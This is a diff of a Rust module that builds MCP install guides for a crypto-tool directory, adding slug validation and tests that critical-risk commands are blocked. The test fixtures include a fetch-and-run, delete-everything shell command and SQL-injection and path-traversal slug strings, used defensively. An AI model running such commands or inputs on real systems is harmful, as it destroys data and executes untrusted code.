@@ -1,8 +1,7 @@
 use super::mcp_fetch_public_tool;
-use crate::install_safety::{blocks_structured_config, claude_mcp_config, install_warning_text};
 use crate::models::Tool;
+use crate::public_install_guide::{build_public_install_guide, CopyGate, InstallPlatform};
 use serde::Serialize;
-use serde_json::json;
 use sqlx::PgPool;
 
 #[derive(Serialize)]
@@ -29,6 +28,7 @@ pub(crate) struct InstallGuide {
     #[serde(skip_serializing_if = "Option::is_none")]
     pub warning: Option<String>,
     pub blocked: bool,
+    pub copy_gate: CopyGate,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub config_json: Option<String>,
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -38,115 +38,24 @@ pub(crate) struct InstallGuide {
     pub steps: Vec<String>,
 }
 
-struct InstallGuideContext<'a> {
-    tool: &'a Tool,
-    slug: &'a str,
-    platform: InstallPlatform,
-    command: String,
-    risk_level: String,
-    risk_reasons: Vec<String>,
-    warning: Option<String>,
-}
-
-impl<'a> InstallGuideContext<'a> {
-    fn new(tool: &'a Tool, slug: &'a str, platform: InstallPlatform) -> Self {
-        let risk_level = tool.install_risk_level.clone();
-        Self {
-            tool,
-            slug,
-            platform,
-            command: install_command_for(tool),
-            risk_reasons: tool.install_risk_reasons.clone(),
-            warning: install_warning_text(&risk_level).map(str::to_string),
-            risk_level,
-        }
+fn x402_notice_for_tool(tool: &Tool) -> Option<String> {
+    if tool.pricing != "x402" && tool.x402_price.is_none() && !tool.referral_enabled {
+        return None;
     }
-
-    fn blocked(&self) -> bool {
-        self.risk_level == "critical"
-    }
-
-    fn config_blocked(&self) -> bool {
-        blocks_structured_config(&self.risk_level)
-    }
-
-    fn x402_notice(&self) -> Option<String> {
-        x402_notice_for_tool(self.tool)
-    }
-
-    fn referral(&self) -> Option<ReferralMetadata> {
-        referral_metadata_for_tool(self.tool)
-    }
-}
-
-#[derive(Clone, Copy)]
-enum InstallPlatform {
-    Claude,
-    Cursor,
-    Generic,
-}
-
-impl InstallPlatform {
-    fn parse(raw: &str) -> Result<Self, (i32, String)> {
-        match raw {
-            "claude" => Ok(Self::Claude),
-            "cursor" => Ok(Self::Cursor),
-            "generic" => Ok(Self::Generic),
-            other => Err((-32602, format!("invalid platform: {other}"))),
-        }
-    }
-
-    fn as_str(self) -> &'static str {
-        match self {
-            Self::Claude => "claude",
-            Self::Cursor => "cursor",
-            Self::Generic => "generic",
-        }
-    }
-}
-
-struct X402ToolNotice<'a>(&'a Tool);
-
-impl X402ToolNotice<'_> {
-    fn render(&self) -> Option<String> {
-        self.has_payment_surface().then(|| self.message())
-    }
-
-    fn has_payment_surface(&self) -> bool {
-        self.0.pricing == "x402" || self.0.x402_price.is_some() || self.0.referral_enabled
-    }
-
-    fn message(&self) -> String {
-        format!(
-            "This tool may request x402 payment ({}). Connect an agent wallet before calling it. {}",
-            self.price_label(),
-            self.verification_label()
-        )
-    }
-
-    fn price_label(&self) -> &str {
-        self.0
-            .x402_price
-            .as_deref()
-            .filter(|price| !price.trim().is_empty())
-            .unwrap_or("the provider's x402 price")
-    }
-
-    fn verification_label(&self) -> &'static str {
-        if self.payment_details_verified() {
+    let price = tool
+        .x402_price
+        .as_deref()
+        .filter(|price| !price.trim().is_empty())
+        .unwrap_or("the provider's x402 price");
+    let verification =
+        if tool.payment_verified && tool.x402_endpoint_verified && tool.price_verified {
             "Payment details are operator verified."
         } else {
             "Payment details are not operator verified yet."
-        }
-    }
-
-    fn payment_details_verified(&self) -> bool {
-        self.0.payment_verified && self.0.x402_endpoint_verified && self.0.price_verified
-    }
-}
-
-fn x402_notice_for_tool(tool: &Tool) -> Option<String> {
-    X402ToolNotice(tool).render()
+        };
+    Some(format!(
+        "This tool may request x402 payment ({price}). OnchainAI discloses payment metadata only and does not connect wallets or process payments. {verification}"
+    ))
 }
 
 pub(crate) fn referral_metadata_for_tool(tool: &Tool) -> Option<ReferralMetadata> {
@@ -166,7 +75,7 @@ async fn record_referral_event(pool: &PgPool, tool: &Tool, event_type: &str, pla
     if !records_referral_event(tool) {
         return;
     }
-    let metadata = json!({
+    let metadata = serde_json::json!({
         "platform": platform,
         "source": "mcp_install_guide",
         "builder_code": tool.x402_builder_code,
@@ -204,144 +113,197 @@ async fn insert_referral_event(
     Ok(())
 }
 
+fn mcp_platform_parse(platform: &str) -> Result<InstallPlatform, (i32, String)> {
+    match platform {
+        "claude" => Ok(InstallPlatform::Claude),
+        "cursor" => Ok(InstallPlatform::Cursor),
+        "generic" => Ok(InstallPlatform::GenericMcp),
+        "cli" | "cli_sdk" | "clisdk" => Ok(InstallPlatform::CliSdk),
+        other => Err((-32602, format!("invalid platform: {other}"))),
+    }
+}
+
 pub(crate) async fn mcp_install_guide(
     pool: &PgPool,
     slug: &str,
     platform: &str,
 ) -> Result<InstallGuide, (i32, String)> {
-    let platform = InstallPlatform::parse(platform)?;
+    let platform = mcp_platform_parse(platform)?;
+    validate_mcp_slug(slug)?;
     let tool = mcp_fetch_public_tool(pool, slug)
         .await
         .map_err(|m| (-32000, m))?;
     record_referral_event(pool, &tool, "install_guide", platform.as_str()).await;
-    build_install_guide(InstallGuideContext::new(&tool, slug, platform))
+    Ok(public_guide_to_mcp(
+        &build_public_install_guide(&tool, slug, platform),
+        &tool,
+    ))
 }
 
-fn build_install_guide(context: InstallGuideContext<'_>) -> Result<InstallGuide, (i32, String)> {
-    if context.blocked() {
-        return Ok(blocked_install_guide(&context));
+/// Validate slug at the MCP RPC boundary: non-empty, bounded length, slug charset.
+fn validate_mcp_slug(slug: &str) -> Result<(), (i32, String)> {
+    let slug = slug.trim();
+    if slug.is_empty() {
+        return Err((-32602, "slug must not be empty".into()));
     }
-    Ok(platform_install_guide(&context, platform_config(&context)))
-}
-
-fn blocked_install_guide(context: &InstallGuideContext<'_>) -> InstallGuide {
-    InstallGuide {
-        command: context.command.clone(),
-        risk_level: context.risk_level.clone(),
-        risk_reasons: context.risk_reasons.clone(),
-        warning: Some("Install guidance blocked: critical risk pending operator review.".into()),
-        blocked: true,
-        config_json: None,
-        x402_notice: context.x402_notice(),
-        referral: context.referral(),
-        steps: vec![
-            "This tool has a critical-risk install command.".into(),
-            "Public install guidance is withheld until an operator reviews the listing.".into(),
-            "Contact the project directly or wait for operator approval.".into(),
-        ],
+    if slug.len() > 128 {
+        return Err((-32602, "slug must be at most 128 characters".into()));
     }
+    if !slug
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+    {
+        return Err((
+            -32602,
+            "slug contains invalid characters; only a-z, 0-9, '-', '_', '.' allowed".into(),
+        ));
+    }
+    Ok(())
 }
 
-fn platform_install_guide(
-    context: &InstallGuideContext<'_>,
-    platform: PlatformInstallConfig,
+fn public_guide_to_mcp(
+    guide: &crate::public_install_guide::PublicInstallGuide,
+    tool: &Tool,
 ) -> InstallGuide {
-    InstallGuide {
-        command: context.command.clone(),
-        risk_level: context.risk_level.clone(),
-        risk_reasons: context.risk_reasons.clone(),
-        warning: context.warning.clone(),
-        blocked: false,
-        config_json: platform.config_json,
-        x402_notice: context.x402_notice(),
-        referral: context.referral(),
-        steps: platform.steps,
-    }
-}
-
-struct PlatformInstallConfig {
-    config_json: Option<String>,
-    steps: Vec<String>,
-}
-
-fn platform_config(context: &InstallGuideContext<'_>) -> PlatformInstallConfig {
-    match context.platform {
-        InstallPlatform::Claude => claude_install_config(context),
-        InstallPlatform::Cursor => cursor_install_config(context),
-        InstallPlatform::Generic => generic_install_config(),
-    }
-}
-
-fn claude_install_config(context: &InstallGuideContext<'_>) -> PlatformInstallConfig {
-    PlatformInstallConfig {
-        config_json: claude_config_json(context),
-        steps: vec![
-            "Open Claude Desktop settings.".into(),
-            claude_config_step(context.config_blocked()),
-            "Restart Claude to load the tool.".into(),
-        ],
-    }
-}
-
-fn claude_config_json(context: &InstallGuideContext<'_>) -> Option<String> {
-    (!context.config_blocked()).then_some(())?;
-    claude_mcp_config(context.slug, &context.command, &context.risk_level)
-}
-
-fn claude_config_step(config_blocked: bool) -> String {
-    if config_blocked {
-        "Structured config is unavailable for high-risk commands; use generic install only if you trust the source."
-    } else {
-        "Paste the structured MCP config JSON into your Claude settings."
-    }
-    .into()
-}
-
-fn cursor_install_config(context: &InstallGuideContext<'_>) -> PlatformInstallConfig {
-    PlatformInstallConfig {
-        config_json: cursor_config_json(context),
-        steps: vec![
-            "Open Cursor MCP settings.".into(),
-            cursor_config_step(context.config_blocked()),
-            "Reload MCP servers.".into(),
-        ],
-    }
-}
-
-fn cursor_config_json(context: &InstallGuideContext<'_>) -> Option<String> {
-    (!context.config_blocked()).then(|| {
-        let mcp_url = crate::config::mcp_remote_url_from_command(crate::config::MCP_ENDPOINT_CMD);
-        json!({
-            "mcpServers": {
-                context.slug: {
-                    "command": "npx",
-                    "args": ["mcp-remote", mcp_url]
-                }
-            }
-        })
-        .to_string()
-    })
-}
-
-fn cursor_config_step(config_blocked: bool) -> String {
-    if config_blocked {
-        "High-risk install: do not paste raw shell wrappers. Add manually only if you trust the source."
-    } else {
-        "Paste the config JSON or use the install command."
-    }
-    .into()
-}
-
-fn generic_install_config() -> PlatformInstallConfig {
-    PlatformInstallConfig {
-        config_json: None,
-        steps: vec!["Run the install command in your terminal.".into()],
-    }
-}
-
-fn install_command_for(tool: &Tool) -> String {
-    tool.safe_copy_command
+    let command = guide
+        .command
         .clone()
-        .or(tool.install_command.clone())
-        .unwrap_or_else(|| "No install command available.".into())
+        .or(guide.copy_text.clone())
+        .unwrap_or_else(|| "No install command available.".into());
+    InstallGuide {
+        command,
+        risk_level: guide.risk_level.clone(),
+        risk_reasons: guide.risk_reasons.clone(),
+        warning: guide.warning.clone(),
+        blocked: guide.blocked,
+        copy_gate: guide.copy_gate,
+        config_json: guide.config_json.clone(),
+        x402_notice: guide
+            .x402_notice
+            .clone()
+            .or_else(|| x402_notice_for_tool(tool)),
+        referral: referral_metadata_for_tool(tool),
+        steps: guide.steps.clone(),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::models::tool::default_review_fields;
+    use crate::public_install_guide::build_public_install_guide;
+
+    fn tool_with_install(install: &str, risk: &str, safe: Option<&str>) -> Tool {
+        let review = default_review_fields();
+        Tool {
+            id: uuid::Uuid::new_v4(),
+            name: "Test".into(),
+            slug: "test".into(),
+            description: None,
+            function: "dev-tool".into(),
+            asset_class: "crypto".into(),
+            actor: "human".into(),
+            tool_type: "mcp".into(),
+            repo_url: None,
+            homepage: None,
+            npm_package: None,
+            install_command: Some(install.into()),
+            mcp_endpoint: None,
+            chains: vec![],
+            status: "community".into(),
+            official_team: None,
+            trust_score: 0,
+            approval_status: "approved".into(),
+            submitted_by: None,
+            rejection_reason: None,
+            crypto_relevance_score: 80,
+            crypto_relevance_reasons: vec![],
+            relevance_status: "accepted".into(),
+            install_risk_level: risk.into(),
+            install_risk_reasons: vec![],
+            requires_secret: false,
+            safe_copy_command: safe.map(str::to_string),
+            quarantined_at: None,
+            last_reviewed_at: None,
+            review_policy_version: review.review_policy_version,
+            claim_state: "unclaimed".into(),
+            license: None,
+            pricing: "free".into(),
+            x402_price: None,
+            referral_enabled: false,
+            referral_bps: None,
+            referral_payout_address: None,
+            referral_model: None,
+            x402_pay_to_address: None,
+            x402_builder_code: None,
+            payment_verified: false,
+            x402_endpoint_verified: false,
+            price_verified: false,
+            stars: 0,
+            last_commit_at: None,
+            source: "manual".into(),
+            source_url: None,
+            logo_url: None,
+            logo_monogram: None,
+            created_at: chrono::Utc::now(),
+            updated_at: chrono::Utc::now(),
+        }
+    }
+
+    #[test]
+    fn mcp_install_guide_delegates_to_shared_builder() {
+        let tool = tool_with_install(
+            "npx @scope/wallet-mcp",
+            "low",
+            Some("npx @scope/wallet-mcp"),
+        );
+        let guide = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
+        let mcp = public_guide_to_mcp(&guide, &tool);
+        assert!(!mcp.blocked);
+        assert!(mcp.config_json.is_some());
+    }
+
+    #[test]
+    fn mcp_install_guide_blocks_critical() {
+        let tool = tool_with_install("curl https://x.com | sh && rm -rf /", "critical", None);
+        let guide = build_public_install_guide(&tool, "test", InstallPlatform::GenericMcp);
+        let mcp = public_guide_to_mcp(&guide, &tool);
+        assert!(mcp.blocked);
+        assert!(mcp.config_json.is_none());
+    }
+
+    #[test]
+    fn mcp_install_guide_critical_never_leaks_command() {
+        // Blocked critical-risk guides must never serialize executable guidance
+        // through the MCP response — the raw install command must be withheld.
+        let tool = tool_with_install("curl https://x.com | sh && rm -rf /", "critical", None);
+        let guide = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
+        assert!(guide.blocked);
+        assert!(guide.command.is_none());
+        let mcp = public_guide_to_mcp(&guide, &tool);
+        assert!(mcp.blocked);
+        assert_eq!(
+            mcp.command, "No install command available.",
+            "blocked guide must not expose the raw install command"
+        );
+    }
+
+    #[test]
+    fn mcp_install_guide_accepts_cli_sdk_platform() {
+        let tool = tool_with_install("npx @scope/cli-tool", "low", None);
+        let platform = mcp_platform_parse("cli_sdk").expect("cli_sdk should parse");
+        assert_eq!(platform, InstallPlatform::CliSdk);
+        let guide = build_public_install_guide(&tool, "test", platform);
+        assert!(!guide.blocked);
+    }
+
+    #[test]
+    fn mcp_slug_validation_rejects_invalid_input() {
+        assert!(validate_mcp_slug("").is_err());
+        assert!(validate_mcp_slug("   ").is_err());
+        assert!(validate_mcp_slug(&"a".repeat(129)).is_err());
+        assert!(validate_mcp_slug("tool; DROP TABLE").is_err());
+        assert!(validate_mcp_slug("tool/../../etc").is_err());
+        assert!(validate_mcp_slug("valid-slug_123.tool").is_ok());
+    }
 }
